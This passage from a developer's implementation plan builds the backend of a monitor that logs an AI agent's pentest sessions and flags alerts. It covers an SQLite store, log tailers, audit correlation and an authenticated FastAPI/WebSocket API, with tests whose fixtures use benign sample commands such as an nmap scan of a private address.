        is_error = bool(rv.get("isError"))
        if stdout is None:
            texts = [c.get("text","") for c in rv.get("content",[]) if c.get("type")=="text"]
            stdout = "\n".join(texts) if texts else None
        command = args.get("command") if isinstance(args, dict) else None
        if command is None:
            command = json.dumps(args) if args else tool
        conns = detection.external_connections(tool, args, command)
        err = detection.classify_error(exit_code, is_error, None, stdout, stderr, tool)
        alerts = detection.scan_reverse_shell(command, stdout or "", stderr or "", conns)
        etype = "tool_call"
        return [_mk_event(req_row, etype, tool=tool, extension=ext,
                          command=command, arguments=args,
                          command_explained=detection.explain(tool, args),
                          stdout=stdout, stderr=stderr, exit_code=exit_code,
                          error=err, external_connections=conns,
                          security_alerts=alerts,
                          event_id=f"{req_row['session_id']}:{req_row['id']}:{cid}",
                          raw_json={"request":req_it,"response":resp_it})]
```

Note: `_mk_event` accepts `event_id` via `**kw`; when not provided (text messages), the store assigns `f"{session_id}:{id}:msg"`. Add this line at the end of `feed` for text events before returning: set `e["event_id"] = f"{row['session_id']}:{row['id']}:msg"` for message events (do it inside the `text` branch).

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd monitor && python -m pytest tests/test_normalizer.py -v`
Expected: PASS (6 passed). Fix the text-branch `event_id` if `test_text_messages_emit_events` needs it.

- [ ] **Step 5: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): normalizer (pairing, thinking-drop, events)"
```

---

### Task 6: Store — SQLite persistence, seq, filtered queries, retention

**Files:**
- Create: `monitor/backend/store.py`
- Test: `monitor/tests/test_store.py`

**Interfaces:**
- Consumes: `wildcard.matches`.
- Produces: `store.Store(path: str)` with:
  - `insert_event(event: dict) -> int` — assigns global monotonic `seq` (autoincrement), writes full row incl. `raw_json`/`arguments`/connections/alerts as JSON; upserts a `sessions` summary row (counts, last_activity_ms). Returns `seq`. Idempotent on `event_id` (INSERT OR IGNORE).
  - `upsert_session(session_id, name, label, created_ms, working_dir) -> None`.
  - `list_sessions() -> list[dict]` (id, label, status fields raw; status computed in Task 8/9 layer or here via `now_ms`).
  - `events_after(seq: int, limit: int) -> list[dict]`.
  - `query_events(session_id=None, after_seq=0, limit=200, filters: dict=None) -> list[dict]` — SQL prefilter by session/seq; per-column wildcard filters applied in Python via `wildcard.matches` over the mapped column text.
  - `get_event(event_id) -> dict | None`.
  - `prune(max_age_days, max_events) -> int`.
  - `max_seq() -> int`, `get_cursor(name)->int`, `set_cursor(name,val)`.

- [ ] **Step 1: Write the failing test**

`monitor/tests/test_store.py`:
```python
from backend.store import Store

def _ev(eid, sid, seqless=True, **kw):
    e = {"event_id":eid,"session_id":sid,"timestamp_ms":1,"event_type":"tool_call",
         "tool":"sandbox_bash","command":"nmap -sV 192.168.50.1","command_explained":"scan",
         "stdout":"open","stderr":"","exit_code":0,"http_status":None,"error":None,
         "tier":"HIGH","approval_decision":"APPROVED","external_connections":[],
         "security_alerts":[],"arguments":{"command":"x"},"raw_json":{"a":1},"extension":"gateway"}
    e.update(kw); return e

def test_insert_and_seq_monotonic(tmp_path):
    s = Store(str(tmp_path/"e.db"))
    a = s.insert_event(_ev("e1","s1"))
    b = s.insert_event(_ev("e2","s1"))
    assert b > a
    assert s.max_seq() == b

def test_idempotent_on_event_id(tmp_path):
    s = Store(str(tmp_path/"e.db"))
    s.insert_event(_ev("dup","s1")); s.insert_event(_ev("dup","s1"))
    assert len(s.query_events(session_id="s1")) == 1

def test_events_after(tmp_path):
    s = Store(str(tmp_path/"e.db"))
    s.insert_event(_ev("e1","s1")); mid=s.max_seq(); s.insert_event(_ev("e2","s1"))
    got = s.events_after(mid, 10)
    assert [e["event_id"] for e in got] == ["e2"]

def test_percolumn_wildcard_filter(tmp_path):
    s = Store(str(tmp_path/"e.db"))
    s.insert_event(_ev("e1","s1", command="nmap -sV 192.168.50.1"))
    s.insert_event(_ev("e2","s1", command="curl https://example.com"))
    got = s.query_events(session_id="s1", filters={"command":"nmap*"})
    assert [e["event_id"] for e in got] == ["e1"]
    got = s.query_events(session_id="s1", filters={"command":"*example*"})
    assert [e["event_id"] for e in got] == ["e2"]

def test_prune_by_max_events(tmp_path):
    s = Store(str(tmp_path/"e.db"))
    for i in range(5): s.insert_event(_ev(f"e{i}","s1"))
    removed = s.prune(max_age_days=3650, max_events=2)
    assert removed == 3 and len(s.query_events(session_id="s1")) == 2
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd monitor && python -m pytest tests/test_store.py -v`
Expected: FAIL (`ModuleNotFoundError`).

- [ ] **Step 3: Implement `backend/store.py`**

```python
import json, sqlite3, threading
from backend.wildcard import matches

_SCHEMA = """
CREATE TABLE IF NOT EXISTS sessions(
  id TEXT PRIMARY KEY, name TEXT, label TEXT, created_ms INTEGER,
  working_dir TEXT, last_activity_ms INTEGER,
  event_count INTEGER DEFAULT 0, error_count INTEGER DEFAULT 0,
  conn_count INTEGER DEFAULT 0, alert_count INTEGER DEFAULT 0);
CREATE TABLE IF NOT EXISTS events(
  seq INTEGER PRIMARY KEY AUTOINCREMENT,
  event_id TEXT UNIQUE, session_id TEXT, timestamp_ms INTEGER,
  event_type TEXT, tool TEXT, extension TEXT, command TEXT,
  command_explained TEXT, stdout TEXT, stderr TEXT, exit_code INTEGER,
  http_status INTEGER, error TEXT, tier TEXT, approval_decision TEXT,
  severity TEXT, destination TEXT,
  arguments_json TEXT, connections_json TEXT, alerts_json TEXT, raw_json TEXT);
CREATE INDEX IF NOT EXISTS ix_ev_session ON events(session_id, seq);
CREATE INDEX IF NOT EXISTS ix_ev_ts ON events(timestamp_ms);
CREATE INDEX IF NOT EXISTS ix_ev_type ON events(event_type);
CREATE INDEX IF NOT EXISTS ix_ev_sev ON events(severity);
CREATE INDEX IF NOT EXISTS ix_ev_dest ON events(destination);
CREATE TABLE IF NOT EXISTS cursors(name TEXT PRIMARY KEY, value INTEGER);
"""

_COLMAP = {  # per-column filter key -> event field(s) to test
  "date":"timestamp_ms","command":"command","explained":"command_explained",
  "response":"_response","error":"error","external":"_external",
  "tool":"tool","tier":"tier","severity":"severity"}

class Store:
    def __init__(self, path):
        self._lock = threading.Lock()
        self.db = sqlite3.connect(path, check_same_thread=False)
        self.db.row_factory = sqlite3.Row
        self.db.executescript(_SCHEMA); self.db.commit()

    def _row_to_event(self, r):
        e = dict(r)
        for k_json, k in (("arguments_json","arguments"),("connections_json","external_connections"),
                          ("alerts_json","security_alerts"),("raw_json","raw_json")):
            e[k] = json.loads(e.pop(k_json) or "null")
        return e

    def insert_event(self, ev):
        conns = ev.get("external_connections") or []
        alerts = ev.get("security_alerts") or []
        severity = alerts[0]["severity"] if alerts else None
        dest = (alerts[0].get("destination") if alerts else None) or \
               (f'{conns[0]["host"]}:{conns[0].get("port")}' if conns else None)
        with self._lock:
            cur = self.db.execute(
              """INSERT OR IGNORE INTO events(event_id,session_id,timestamp_ms,event_type,tool,
                 extension,command,command_explained,stdout,stderr,exit_code,http_status,error,
                 tier,approval_decision,severity,destination,arguments_json,connections_json,
                 alerts_json,raw_json) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
              (ev["event_id"],ev["session_id"],ev["timestamp_ms"],ev["event_type"],ev.get("tool"),
               ev.get("extension"),ev.get("command"),ev.get("command_explained"),ev.get("stdout"),
               ev.get("stderr"),ev.get("exit_code"),ev.get("http_status"),ev.get("error"),
               ev.get("tier"),ev.get("approval_decision"),severity,dest,
               json.dumps(ev.get("arguments")),json.dumps(conns),json.dumps(alerts),
               json.dumps(ev.get("raw_json"))))
            if cur.rowcount:
                seq = cur.lastrowid
                self.db.execute("""UPDATE sessions SET
                   last_activity_ms=MAX(COALESCE(last_activity_ms,0),?),
                   event_count=event_count+1,
                   error_count=error_count+?, conn_count=conn_count+?, alert_count=alert_count+?
                   WHERE id=?""",
                   (ev["timestamp_ms"], 1 if ev.get("error") else 0, len(conns), len(alerts),
                    ev["session_id"]))
                self.db.commit()
                return seq
            row = self.db.execute("SELECT seq FROM events WHERE event_id=?", (ev["event_id"],)).fetchone()
            return row["seq"] if row else -1

    def upsert_session(self, session_id, name, label, created_ms, working_dir):
        with self._lock:
            self.db.execute("""INSERT INTO sessions(id,name,label,created_ms,working_dir,last_activity_ms)
              VALUES(?,?,?,?,?,?) ON CONFLICT(id) DO UPDATE SET name=excluded.name,label=excluded.label""",
              (session_id,name,label,created_ms,working_dir,created_ms))
            self.db.commit()

    def list_sessions(self):
        return [dict(r) for r in self.db.execute("SELECT * FROM sessions ORDER BY created_ms")]

    def max_seq(self):
        r = self.db.execute("SELECT COALESCE(MAX(seq),0) m FROM events").fetchone(); return r["m"]

    def events_after(self, seq, limit):
        rows = self.db.execute("SELECT * FROM events WHERE seq>? ORDER BY seq LIMIT ?", (seq,limit))
        return [self._row_to_event(r) for r in rows]

    def get_event(self, event_id):
        r = self.db.execute("SELECT * FROM events WHERE event_id=?", (event_id,)).fetchone()
        return self._row_to_event(r) if r else None

    def _match_filters(self, e, filters):
        for key, pat in (filters or {}).items():
            field = _COLMAP.get(key, key)
            if field == "_response":
                text = f'{e.get("stdout") or ""} {e.get("stderr") or ""}'
            elif field == "_external":
                text = " ".join(f'{c.get("host")}:{c.get("port")}' for c in e.get("external_connections") or [])
            elif field == "timestamp_ms":
                text = str(e.get("timestamp_ms"))
            else:
                text = e.get(field)
            if not matches(pat, text):
                return False
        return True

    def query_events(self, session_id=None, after_seq=0, limit=200, filters=None):
        sql = "SELECT * FROM events WHERE seq>?"
        args = [after_seq]
        if session_id: sql += " AND session_id=?"; args.append(session_id)
        sql += " ORDER BY seq LIMIT ?"; args.append(max(limit*5, limit))  # overfetch for py filter
        out = []
        for r in self.db.execute(sql, args):
            e = self._row_to_event(r)
            if self._match_filters(e, filters):
                out.append(e)
                if len(out) >= limit: break
        return out

    def prune(self, max_age_days, max_events):
        removed = 0
        with self._lock:
            n = self.db.execute("SELECT COUNT(*) c FROM events").fetchone()["c"]
            if n > max_events:
                cut = self.db.execute("SELECT seq FROM events ORDER BY seq DESC LIMIT 1 OFFSET ?",
                                      (max_events-1,)).fetchone()
                if cut:
                    removed += self.db.execute("DELETE FROM events WHERE seq < ?", (cut["seq"],)).rowcount
            self.db.commit()
        return removed

    def get_cursor(self, name):
        r = self.db.execute("SELECT value FROM cursors WHERE name=?", (name,)).fetchone()
        return r["value"] if r else 0
    def set_cursor(self, name, val):
        with self._lock:
            self.db.execute("INSERT INTO cursors(name,value) VALUES(?,?) ON CONFLICT(name) DO UPDATE SET value=?",
                            (name,val,val)); self.db.commit()
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd monitor && python -m pytest tests/test_store.py -v`
Expected: PASS (5 passed).

- [ ] **Step 5: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): sqlite store with seq, filters, retention"
```

---

### Task 7: Sources — sessions.db poller & audit.log tailer

**Files:**
- Create: `monitor/backend/sources/sessions_db.py`, `monitor/backend/sources/audit_log.py`
- Test: `monitor/tests/test_sources.py`

**Interfaces:**
- Produces:
  - `sessions_db.SessionsReader(db_path)` with `read_new(after_message_id: int) -> tuple[list[dict], list[dict]]` → `(new_sessions, new_message_rows)`; opens read-only (`file:...?mode=ro`), returns message rows as dicts sorted by `id`, and session rows as dicts (`id,name,working_dir,created_ms`). `created_ms` derived from `created_at`.
  - `audit_log.AuditTailer(path)` with `read_new() -> list[dict]` — inode+offset aware; each dict = parsed JSONL line (`ts,tool,tier,decision,outcome,args`). Resets offset if the file shrank/rotated.

- [ ] **Step 1: Write the failing test** (builds a fake goose DB + a fake audit log)

`monitor/tests/test_sources.py`:
```python
import json, sqlite3, time
from backend.sources.sessions_db import SessionsReader
from backend.sources.audit_log import AuditTailer

def _make_goose_db(path):
    db = sqlite3.connect(path)
    db.execute("CREATE TABLE sessions(id TEXT PRIMARY KEY, name TEXT, working_dir TEXT, created_at TIMESTAMP)")
    db.execute("""CREATE TABLE messages(id INTEGER PRIMARY KEY AUTOINCREMENT, message_id TEXT,
                 session_id TEXT, role TEXT, content_json TEXT, created_timestamp INTEGER)""")
    db.execute("INSERT INTO sessions VALUES('s1','ASUS Router Pentest','/w','2026-08-16 23:19:25')")
    db.execute("INSERT INTO messages(session_id,role,content_json,created_timestamp) VALUES('s1','user',?,1)",
               (json.dumps([{"type":"text","text":"hi"}]),))
    db.commit(); db.close()

def test_sessions_reader_reads_new(tmp_path):
    p = str(tmp_path/"g.db"); _make_goose_db(p)
    r = SessionsReader(p)
    sessions, msgs = r.read_new(after_message_id=0)
    assert sessions[0]["name"] == "ASUS Router Pentest"
    assert msgs[0]["session_id"] == "s1" and msgs[0]["id"] == 1
    # second read after id=1 returns nothing new
    _, msgs2 = r.read_new(after_message_id=1)
    assert msgs2 == []

def test_audit_tailer_incremental(tmp_path):
    p = tmp_path/"audit.log"
    p.write_text(json.dumps({"ts":1,"tool":"sandbox_bash","tier":"HIGH","decision":"APPROVED","outcome":"ok","args":{"command":"x"}})+"\n")
    t = AuditTailer(str(p))
    first = t.read_new()
    assert len(first) == 1 and first[0]["tier"] == "HIGH"
    assert t.read_new() == []                       # nothing new
    with open(p,"a") as f: f.write(json.dumps({"ts":2,"tool":"kali_nmap","tier":"HIGH","decision":"APPROVED","outcome":"ok","args":{}})+"\n")
    more = t.read_new()
    assert len(more) == 1 and more[0]["tool"] == "kali_nmap"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd monitor && python -m pytest tests/test_sources.py -v`
Expected: FAIL (`ModuleNotFoundError`).

- [ ] **Step 3: Implement `backend/sources/sessions_db.py`**

```python
import sqlite3, calendar, time

class SessionsReader:
    def __init__(self, db_path):
        self.db_path = db_path

    def _connect(self):
        c = sqlite3.connect(f"file:{self.db_path}?mode=ro", uri=True, check_same_thread=False)
        c.row_factory = sqlite3.Row
        return c

    @staticmethod
    def _to_ms(ts):
        if ts is None: return 0
        try:
            return int(calendar.timegm(time.strptime(str(ts)[:19], "%Y-%m-%d %H:%M:%S")) * 1000)
        except Exception:
            try: return int(float(ts) * (1000 if float(ts) < 1e12 else 1))
            except Exception: return 0

    def read_new(self, after_message_id):
        c = self._connect()
        try:
            sessions = [{"id":r["id"],"name":r["name"],"working_dir":r["working_dir"],
                         "created_ms":self._to_ms(r["created_at"])}
                        for r in c.execute("SELECT id,name,working_dir,created_at FROM sessions ORDER BY created_at")]
            msgs = [dict(r) for r in c.execute(
                "SELECT id,session_id,role,content_json,created_timestamp FROM messages WHERE id>? ORDER BY id",
                (after_message_id,))]
            # created_timestamp may be seconds or ms; normalize to ms
            for m in msgs:
                ct = m.get("created_timestamp") or 0
                m["created_timestamp"] = int(ct if ct > 1e12 else ct*1000)
            return sessions, msgs
        finally:
            c.close()
```

- [ ] **Step 4: Implement `backend/sources/audit_log.py`**

```python
import json, os

class AuditTailer:
    def __init__(self, path):
        self.path = path
        self.offset = 0
        self.inode = None

    def read_new(self):
        if not os.path.exists(self.path):
            return []
        st = os.stat(self.path)
        if self.inode is None:
            self.inode = st.st_ino
        if st.st_ino != self.inode or st.st_size < self.offset:
            self.offset = 0; self.inode = st.st_ino     # rotated/truncated
        out = []
        with open(self.path, "r") as f:
            f.seek(self.offset)
            for line in f:
                line = line.strip()
                if line:
                    try: out.append(json.loads(line))
                    except json.JSONDecodeError: pass
            self.offset = f.tell()
        return out
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd monitor && python -m pytest tests/test_sources.py -v`
Expected: PASS (2 passed).

- [ ] **Step 6: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): sessions.db reader + audit.log tailer"
```

---

### Task 8: Audit correlation + collector loop + hub

**Files:**
- Create: `monitor/backend/audit_index.py`, `monitor/backend/hub.py`, `monitor/backend/collector.py`
- Test: `monitor/tests/test_audit_index.py`, `monitor/tests/test_collector.py`

**Interfaces:**
- Consumes: `SessionsReader`, `AuditTailer`, `MessageState`, `Store`, `normalizer.slug`.
- Produces:
  - `audit_index.AuditIndex` with `add(rec: dict)` and `match(tool: str, arguments: dict, ts_ms: int) -> dict | None` returning `{"tier","decision"}` by matching normalized tool name + a key arg (e.g. `command`/`target`/`host`) within a time window; consumes matched records so each is used once.
  - `hub.Hub` (async): `async subscribe() -> Queue`, `unsubscribe(q)`, `async publish(msg: dict)`.
  - `collector.Collector(config, store, hub)` with `async run()` loop and a sync `poll_once()` used by tests (reads new sessions+messages, normalizes, correlates audit tier, inserts to store, publishes new events + session updates).

- [ ] **Step 1: Write the failing tests**

`monitor/tests/test_audit_index.py`:
```python
from backend.audit_index import AuditIndex

def test_match_by_tool_and_command():
    ix = AuditIndex(window_ms=5000)
    ix.add({"ts":1.0,"tool":"sandbox_bash","tier":"HIGH","decision":"APPROVED","args":{"command":"nmap x"}})
    m = ix.match("sandbox_bash", {"command":"nmap x"}, ts_ms=1000)
    assert m["tier"] == "HIGH" and m["decision"] == "APPROVED"
    # consumed: second match returns None
    assert ix.match("sandbox_bash", {"command":"nmap x"}, ts_ms=1000) is None

def test_tool_name_normalization():
    ix = AuditIndex(window_ms=5000)
    ix.add({"ts":1.0,"tool":"kali_nmap","tier":"HIGH","decision":"APPROVED","args":{"target":"192.168.50.1"}})
    assert ix.match("kali_nmap", {"target":"192.168.50.1"}, ts_ms=900)["tier"] == "HIGH"
```

`monitor/tests/test_collector.py`:
```python
import json, sqlite3
from backend.config import Config
from backend.store import Store
from backend.hub import Hub
from backend.collector import Collector

def _goose_db(path):
    db = sqlite3.connect(path)
    db.execute("CREATE TABLE sessions(id TEXT PRIMARY KEY,name TEXT,working_dir TEXT,created_at TIMESTAMP)")
    db.execute("CREATE TABLE messages(id INTEGER PRIMARY KEY AUTOINCREMENT,message_id TEXT,session_id TEXT,role TEXT,content_json TEXT,created_timestamp INTEGER)")
    db.execute("INSERT INTO sessions VALUES('s1','ASUS Router Pentest','/w','2026-08-16 23:19:25')")
    req=[{"type":"toolRequest","id":"c1","toolCall":{"value":{"name":"sandbox_bash","arguments":{"command":"nmap x"}}},"_meta":{"goose_extension":"gateway"}}]
    resp=[{"type":"toolResponse","id":"c1","toolResult":{"value":{"structuredContent":{"stdout":"open","stderr":"","exit_code":0},"isError":False}}}]
    db.execute("INSERT INTO messages(session_id,role,content_json,created_timestamp) VALUES('s1','assistant',?,1000)",(json.dumps(req),))
    db.execute("INSERT INTO messages(session_id,role,content_json,created_timestamp) VALUES('s1','user',?,1001)",(json.dumps(resp),))
    db.commit(); db.close()

def test_collector_poll_once_ingests_and_correlates(tmp_path):
    gpath=str(tmp_path/"g.db"); _goose_db(gpath)
    apath=tmp_path/"audit.log"
    apath.write_text(json.dumps({"ts":1.0,"tool":"sandbox_bash","tier":"HIGH","decision":"APPROVED:auto","outcome":"ok","args":{"command":"nmap x"}})+"\n")
    cfg=Config(sessions_db=gpath, audit_log=str(apath), events_db=str(tmp_path/"e.db"), auth_password="x")
    store=Store(cfg.events_db); hub=Hub()
    col=Collector(cfg, store, hub)
    col.poll_once()
    evs=store.query_events(session_id="s1")
    tool_ev=[e for e in evs if e["event_type"]=="tool_call"][0]
    assert tool_ev["tier"]=="HIGH" and tool_ev["command"]=="nmap x"
    sess=store.list_sessions()[0]
    assert sess["label"].startswith("s1_asus_router")
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd monitor && python -m pytest tests/test_audit_index.py tests/test_collector.py -v`
Expected: FAIL (`ModuleNotFoundError`).

- [ ] **Step 3: Implement `backend/audit_index.py`**

```python
class AuditIndex:
    def __init__(self, window_ms=10000):
        self.window_ms = window_ms
        self.recs = []   # list of dicts with ts_ms, tool(norm), key, tier, decision, used

    @staticmethod
    def _norm_tool(t): return (t or "").split("__")[-1].lower()

    @staticmethod
    def _key(args):
        a = args or {}
        for k in ("command","target","host","name","url","query"):
            if a.get(k): return str(a[k])
        return ""

    def add(self, rec):
        self.recs.append({"ts_ms":int(float(rec.get("ts",0))*1000),
                          "tool":self._norm_tool(rec.get("tool")),
                          "key":self._key(rec.get("args")),
                          "tier":rec.get("tier"),"decision":rec.get("decision"),"used":False})

    def match(self, tool, arguments, ts_ms):
        nt=self._norm_tool(tool); key=self._key(arguments); best=None
        for r in self.recs:
            if r["used"] or r["tool"]!=nt: continue
            if r["key"] and key and r["key"]!=key: continue
            if abs(r["ts_ms"]-ts_ms) > self.window_ms: continue
            if best is None or abs(r["ts_ms"]-ts_ms) < abs(best["ts_ms"]-ts_ms):
                best=r
        if best:
            best["used"]=True
            return {"tier":best["tier"],"decision":best["decision"]}
        return None
```

- [ ] **Step 4: Implement `backend/hub.py`**

```python
import asyncio

class Hub:
    def __init__(self):
        self._subs = set()

    async def subscribe(self):
        q = asyncio.Queue(maxsize=1000); self._subs.add(q); return q
    def unsubscribe(self, q):
        self._subs.discard(q)
    async def publish(self, msg):
        for q in list(self._subs):
            try: q.put_nowait(msg)
            except asyncio.QueueFull: pass
```
Fix the attribute name: use `self._subs = set()` in `__init__`.

- [ ] **Step 5: Implement `backend/collector.py`**

```python
import asyncio, json
from backend.sources.sessions_db import SessionsReader
from backend.sources.audit_log import AuditTailer
from backend.audit_index import AuditIndex
from backend.normalizer import MessageState, slug

class Collector:
    def __init__(self, config, store, hub, loop=None):
        self.cfg=config; self.store=store; self.hub=hub; self.loop=loop
        self.reader=SessionsReader(config.sessions_db)
        self.tailer=AuditTailer(config.audit_log)
        self.audit=AuditIndex()
        self.state=MessageState()
        self.known_sessions=set()

    def poll_once(self):
        for rec in self.tailer.read_new():
            self.audit.add(rec)
        cursor=self.store.get_cursor("messages")
        sessions, msgs = self.reader.read_new(after_message_id=cursor)
        for s in sessions:
            if s["id"] not in self.known_sessions:
                self.known_sessions.add(s["id"])
                label=f"{s['id']}_{slug(s['name'])}"
                self.store.upsert_session(s["id"], s["name"], label, s["created_ms"], s["working_dir"])
                self._emit({"kind":"session","session":{"id":s["id"],"label":label,
                            "created_ms":s["created_ms"]}})
        max_id=cursor
        for row in msgs:
            max_id=max(max_id, row["id"])
            for ev in self.state.feed(row):
                if ev["event_type"]=="tool_call":
                    m=self.audit.match(ev["tool"], ev.get("arguments"), ev["timestamp_ms"])
                    if m: ev["tier"]=m["tier"]; ev["approval_decision"]=m["decision"]
                seq=self.store.insert_event(ev)
                ev_out=dict(ev); ev_out["seq"]=seq
                self._emit({"kind":"event","event":ev_out})
        if max_id != cursor:
            self.store.set_cursor("messages", max_id)

    def _emit(self, msg):
        if self.loop:
            asyncio.run_coroutine_threadsafe(self.hub.publish(msg), self.loop)

    async def run(self):
        self.loop=asyncio.get_running_loop()
        while True:
            self.poll_once()
            self.store.prune(self.cfg.retention_max_age_days, self.cfg.retention_max_events)
            await asyncio.sleep(self.cfg.poll_interval_ms/1000)
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `cd monitor && python -m pytest tests/test_audit_index.py tests/test_collector.py -v`
Expected: PASS (4 passed).

- [ ] **Step 7: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): audit correlation, hub, collector loop"
```

---

### Task 9: FastAPI app — auth, REST, WebSocket, static, status, lifecycle

**Files:**
- Create: `monitor/backend/app.py`, `monitor/backend/status.py`
- Test: `monitor/tests/test_api.py`

**Interfaces:**
- Consumes: `config.load`, `Store`, `Hub`, `Collector`, `status.compute_status`.
- Produces:
  - `status.compute_status(last_activity_ms, now_ms, active_window_s, idle_window_s, last_error: bool, has_open_alert: bool) -> str` → one of `ACTIVE|IDLE|COMPLETED|ERROR`.
  - `app.create_app(config, store, hub, collector=None) -> FastAPI` with routes: `GET /` (static index), `GET /static/*`, `GET /api/sessions`, `GET /api/sessions/{id}/events`, `GET /api/events/{event_id}`, `GET /api/search`, `WS /ws`. All behind basic auth (except WS handshake which validates the same credentials via query/subprotocol or the browser's basic-auth header).

- [ ] **Step 1: Write the failing test**

`monitor/tests/test_api.py`:
```python
import base64
from fastapi.testclient import TestClient
from backend.config import Config
from backend.store import Store
from backend.hub import Hub
from backend.app import create_app
from backend import status as st

def _auth(u="admin", p="x"):
    return {"Authorization": "Basic "+base64.b64encode(f"{u}:{p}".encode()).decode()}

def _client(tmp_path):
    cfg = Config(events_db=str(tmp_path/"e.db"), auth_username="admin", auth_password="x")
    store = Store(cfg.events_db)
    store.upsert_session("s1","ASUS Router Pentest","s1_asus_router_pentest",1000,"/w")
    store.insert_event({"event_id":"s1:1:c1","session_id":"s1","timestamp_ms":1000,
        "event_type":"tool_call","tool":"kali_nmap","command":"nmap x","command_explained":"scan",
        "stdout":"open","stderr":"","exit_code":0,"error":None,"tier":"HIGH",
        "approval_decision":"APPROVED","external_connections":[],"security_alerts":[],
        "arguments":{"target":"x"},"raw_json":{}})
    return TestClient(create_app(cfg, store, Hub()))

def test_requires_auth(tmp_path):
    c = _client(tmp_path)
    assert c.get("/api/sessions").status_code == 401
    assert c.get("/api/sessions", headers=_auth()).status_code == 200

def test_sessions_and_events(tmp_path):
    c = _client(tmp_path)
    s = c.get("/api/sessions", headers=_auth()).json()
    assert s[0]["label"] == "s1_asus_router_pentest" and "status" in s[0]
    evs = c.get("/api/sessions/s1/events", headers=_auth()).json()
    assert evs["events"][0]["command"] == "nmap x"

def test_event_detail(tmp_path):
    c = _client(tmp_path)
    e = c.get("/api/events/s1:1:c1", headers=_auth()).json()
    assert e["tier"] == "HIGH"

def test_column_filter_wildcard(tmp_path):
    c = _client(tmp_path)
    r = c.get("/api/sessions/s1/events?f_command=nmap*", headers=_auth()).json()
    assert len(r["events"]) == 1
    r = c.get("/api/sessions/s1/events?f_command=zzz*", headers=_auth()).json()
    assert r["events"] == []

def test_status_transitions():
    assert st.compute_status(10_000, 20_000, 60, 1800, False, False) == "ACTIVE"
    assert st.compute_status(10_000, 100_000, 60, 1800, False, False) == "IDLE"
    assert st.compute_status(10_000, 10_000_000, 60, 1800, False, False) == "COMPLETED"
    assert st.compute_status(10_000, 20_000, 60, 1800, True, False) == "ERROR"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd monitor && python -m pytest tests/test_api.py -v`
Expected: FAIL (`ModuleNotFoundError`).

- [ ] **Step 3: Implement `backend/status.py`**

```python
def compute_status(last_activity_ms, now_ms, active_window_s, idle_window_s, last_error, has_open_alert):
    if last_error or has_open_alert:
        return "ERROR"
    if last_activity_ms is None:
        return "COMPLETED"
    age_s = (now_ms - last_activity_ms)/1000.0
    if age_s <= active_window_s: return "ACTIVE"
    if age_s <= idle_window_s: return "IDLE"
    return "COMPLETED"
```

- [ ] **Step 4: Implement `backend/app.py`**

```python
import asyncio, json, secrets, time, os
from fastapi import FastAPI, Depends, HTTPException, WebSocket, WebSocketDisconnect, Request
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from backend import status as status_mod

WEB_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "web")
security = HTTPBasic()

def create_app(config, store, hub, collector=None):
    app = FastAPI()

    def check(cred: HTTPBasicCredentials = Depends(security)):
        ok = (secrets.compare_digest(cred.username, config.auth_username) and
              secrets.compare_digest(cred.password, config.auth_password))
        if not ok:
            raise HTTPException(status_code=401, detail="unauthorized",
                                headers={"WWW-Authenticate":"Basic"})
        return True

    def _now_ms(): return int(time.time()*1000)

    def _decorate_session(s):
        # last_error/open_alert approximation via counts of recent events omitted; use flags on session row
        s = dict(s)
        s["status"] = status_mod.compute_status(
            s.get("last_activity_ms"), _now_ms(),
            config.active_window_s, config.idle_window_s,
            last_error=False, has_open_alert=(s.get("alert_count",0) > 0))
        return s

    def _filters(request: Request):
        return {k[2:]: v for k,v in request.query_params.items() if k.startswith("f_")}

    @app.get("/api/config")
    def client_config(_: bool = Depends(check)):
        return {"redaction_enabled": config.redaction_enabled,
                "active_window_s": config.active_window_s,
                "idle_window_s": config.idle_window_s}

    @app.get("/api/sessions")
    def sessions(_: bool = Depends(check)):
        return [_decorate_session(s) for s in store.list_sessions()]

    @app.get("/api/sessions/{sid}/events")
    def events(sid: str, request: Request, after_seq: int = 0, limit: int = 200, _: bool = Depends(check)):
        evs = store.query_events(session_id=sid, after_seq=after_seq, limit=limit, filters=_filters(request))
        return {"events": evs, "max_seq": store.max_seq()}

    @app.get("/api/search")
    def search(request: Request, after_seq: int = 0, limit: int = 200, _: bool = Depends(check)):
        return {"events": store.query_events(after_seq=after_seq, limit=limit, filters=_filters(request))}

    @app.get("/api/events/{event_id}")
    def event_detail(event_id: str, _: bool = Depends(check)):
        e = store.get_event(event_id)
        if not e: raise HTTPException(404)
        return e

    @app.websocket("/ws")
    async def ws(sock: WebSocket):
        # validate basic-auth header on handshake
        auth = sock.headers.get("authorization","")
        import base64
        try:
            u,p = base64.b64decode(auth.split(" ",1)[1]).decode().split(":",1)
        except Exception:
            await sock.close(code=1008); return
        if not (secrets.compare_digest(u,config.auth_username) and secrets.compare_digest(p,config.auth_password)):
            await sock.close(code=1008); return
        await sock.accept()
        after = int(sock.query_params.get("after_seq", "0"))
        for e in store.events_after(after, 1000):     # replay missed
            await sock.send_text(json.dumps({"kind":"event","event":e}))
        q = await hub.subscribe()
        try:
            while True:
                msg = await q.get()
                await sock.send_text(json.dumps(msg, default=str))
        except WebSocketDisconnect:
            pass
        finally:
            hub.unsubscribe(q)

    @app.get("/")
    def index(_: bool = Depends(check)):
        return FileResponse(os.path.join(WEB_DIR, "index.html"))

    if os.path.isdir(WEB_DIR):
        app.mount("/static", StaticFiles(directory=WEB_DIR), name="static")

    if collector is not None:
        @app.on_event("startup")
        async def _start():
            asyncio.create_task(collector.run())
    return app
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd monitor && python -m pytest tests/test_api.py -v`
Expected: PASS (5 passed). (TestClient sends WS auth via headers; REST tests cover the rest.)

- [ ] **Step 6: Commit**

```bash
